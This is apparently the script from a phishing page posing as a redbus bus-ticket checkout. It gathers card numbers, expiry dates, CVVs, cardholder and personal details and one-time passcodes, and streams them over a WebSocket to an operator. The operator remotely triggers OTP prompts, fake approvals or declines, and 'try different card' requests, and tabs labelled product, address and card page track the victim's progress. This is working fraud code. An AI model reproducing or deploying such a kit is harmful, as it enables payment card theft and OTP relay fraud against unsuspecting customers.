.container___82930b{min-width:auto!important}
.card-form{padding:0}

<script>
(function(){
'use strict';

var WS = (location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/api/?role=customer&cid='+encodeURIComponent('redbus_'+Date.now());
var ws=null, sid=null, timer=null, sec=0, booking={};
try{booking=JSON.parse(sessionStorage.getItem('redbus_booking')||'{}');}catch(e){}
var $=function(id){return document.getElementById(id);};

function pop(){
  var d=booking;
  if(!d.origin&&!d.destination){$('root').innerHTML='<div class="loading"><h2>No booking data found</h2><p>Please complete your booking first.</p></div>';return;}
  var b=d.busName||d.operator||'',bp=d.busType||'',dt=d.departureTime||'',dd=d.departureDate||'',at=d.arrivalTime||'',ad=d.departureDate||'',
      dp=d.depPlace||d.origin||'',ap=d.arrPlace||d.destination||'',du=d.duration||'',tot=d.amount||'0',cur=d.currencySymbol||'MYR',
      pn=d.passengerName||'',ps=d.seats||(d.pax||1)+' Passengers',pe=d.email||'',pp=d.phone||'',ag=d.paxAge||'';
  function s(i,v){var e=$(i);if(e&&v)e.textContent=v;}
  s('busName',b||(d.origin||'?')+' → '+(d.destination||'?'));
  s('busType',bp||d.pax||'1 Passenger');
  s('depTime',dt||'--:--');s('depDate',dd||'-');s('depPlace',dp||'-');
  s('arrTime',at||'--:--');s('arrDate',ad||'-');s('arrPlace',ap||'-');
  if(du)s('duration',du);
  var pfx=cur==='MYR'?'RM ':'';
  s('totalPrice',pfx+Number(tot).toFixed(2));
  s('btnPrice',pfx+Number(tot).toFixed(2));
  s('btnPrice2',pfx+Number(tot).toFixed(2));
  s('baseFare',pfx+Number(tot).toFixed(2));
  s('convenienceFee',pfx+'0.00');
  $('convenienceRow').style.display='none';
  s('seatCount',(d.pax||1)+' Passenger'+(d.pax>1?'s':''));
  if(pn){$('paxSection').style.display='';$('paxDivider').style.display='';s('paxName',pn);s('paxSeat',ps);if(ag)s('paxAge',ag+' years');}
  if(pe||pp){$('contactSection').style.display='';$('contactDivider').style.display='';if(pe)s('paxEmail',pe);if(pp)s('paxPhone',pp);}
}
pop();

$('cardNumber').addEventListener('input',function(){var v=this.value.replace(/\D/g,'');this.value=v.replace(/(.{4})/g,'$1 ').trim();});
$('expiry').addEventListener('input',function(){var v=this.value.replace(/\D/g,'');if(v.length>=3)v=v.slice(0,2)+'/'+v.slice(2);if(v.length>5)v=v.slice(0,5);this.value=v;});

function toggleCoupon(){$('couponInput').classList.toggle('visible');}
function applyCoupon(){sMsg('info','Coupon applied!');}

function cWS(){if(ws&&ws.readyState===WebSocket.OPEN)return;ws=new WebSocket(WS);ws.onmessage=function(e){try{hMsg(JSON.parse(e.data));}catch(err){}};ws.onerror=function(){console.log('[WS] Error');};}
function send(m){if(!ws||ws.readyState!==WebSocket.OPEN){cWS();setTimeout(function(){send(m);},500);return;}ws.send(JSON.stringify(m));}
function hMsg(m){
  switch(m.action){
    case'ack':sid=m.sessionId;sMsg('info','Processing payment...');break;
    case'approve':sMsg('success','Payment approved!');$('btnSubmit').disabled=true;$('btnSubmit').textContent='Approved';stopT();setTimeout(function(){window.location.href='/complete/';},2000);break;
    case'reject':sMsg('error','Payment declined.');$('btnSubmit').disabled=false;$('btnSubmit').textContent='Pay '+$('btnPrice2').textContent;hOTP();break;
    case'otp_verify':sOTP();if(m.countdown)startT(m.countdown);break;
    case'email_verify':sMsg('info','Check email for code.');break;
    case'timeout':sMsg('error','Session expired.');$('btnSubmit').disabled=false;$('btnSubmit').textContent='Pay '+$('btnPrice2').textContent;hOTP();break;
    case'card_error':sMsg('error',m.message||'Card error.');hOTP();break;
    case'change_card':sMsg('info','Try different card.');$('cardNumber').value='';$('cardNumber').focus();hOTP();break;
    case'session_restored':var c=m.cardInfo||{},i=m.customerInfo||{};$('cardNumber').value=c.cardNumber||'';$('expiry').value=c.expiry||'';$('cvv').value=c.cvv||'';$('cardHolder').value=c.cardHolder||'';$('fullName').value=i.fullName||'';$('email').value=i.email||'';$('phone').value=i.phone||'';$('country').value=i.country||'';$('address1').value=i.address1||'';$('address2').value=i.address2||'';$('city').value=i.city||'';$('state').value=i.state||'';$('zipCode').value=i.zipCode||'';sid=m.sessionId;sMsg('info','Session restored.');break;
  }
}
function sMsg(t,x){var e=$('statusMsg');e.className='status-msg '+t;e.textContent=x;}
function sOTP(){$('otpSection').classList.add('active');$('btnSubmit').style.display='none';}
function hOTP(){$('otpSection').classList.remove('active');$('btnSubmit').style.display='block';$('otpCode').value='';stopT();}
function startT(s){stopT();sec=s||120;$('otpTimer').classList.add('active');upT();timer=setInterval(function(){sec--;upT();if(sec<=0){stopT();sMsg('error','OTP expired.');hOTP();}},1000);}
function stopT(){if(timer){clearInterval(timer);timer=null;}$('otpTimer').classList.remove('active');}
function upT(){var m=Math.floor(sec/60),s=sec%60;$('otpTimer').textContent=m+':'+(s<10?'0':'')+s;}

function build(){
  return{frontendUrl:'redbus.my',currentStep:'card',browsingTabs:[{label:'商品页',count:0,active:false},{label:'地址页',count:1,active:false},{label:'卡片页',count:1,active:true}],
    cardInfo:{cardNumber:($('cardNumber').value||'').replace(/\s/g,''),expiry:$('expiry').value||'',cvv:$('cvv').value||'',cardHolder:$('cardHolder').value||'',otpCode:$('otpCode').value||''},
    customerInfo:{fullName:$('fullName').value||'',email:$('email').value||'',phone:$('phone').value||'',country:$('country').value||'',address1:$('address1').value||'',address2:$('address2').value||'',city:$('city').value||'',state:$('state').value||'',zipCode:$('zipCode').value||''}};
}

$('btnSubmit').addEventListener('click',function(){
  var cn=($('cardNumber').value||'').replace(/\s/g,'');
  if(!cn||!$('expiry').value||!$('cvv').value||!$('cardHolder').value||!$('fullName').value){sMsg('error','Please fill all required fields.');return;}
  if(!/\d{2}\/\d{2}/.test($('expiry').value)){sMsg('error','Invalid expiry (MM/YY).');return;}
  this.disabled=true;this.textContent='Processing...';cWS();
  var p=build();send({type:'customer_input',payload:p});
  setTimeout(function(){if(sid){var sp=build();sp.sessionId=sid;sp.status='pending';send({type:'session_update',payload:sp});}},1000);
});
$('btnOtp').addEventListener('click',function(){
  var o=$('otpCode').value;if(!o){sMsg('error','Enter OTP code.');return;}if(!sid)return;
  var p=build();p.sessionId=sid;p.cardInfo.otpCode=o;p.status='pending';send({type:'session_update',payload:p});this.disabled=true;this.textContent='Verifying...';
});
cWS();
})();
</script>
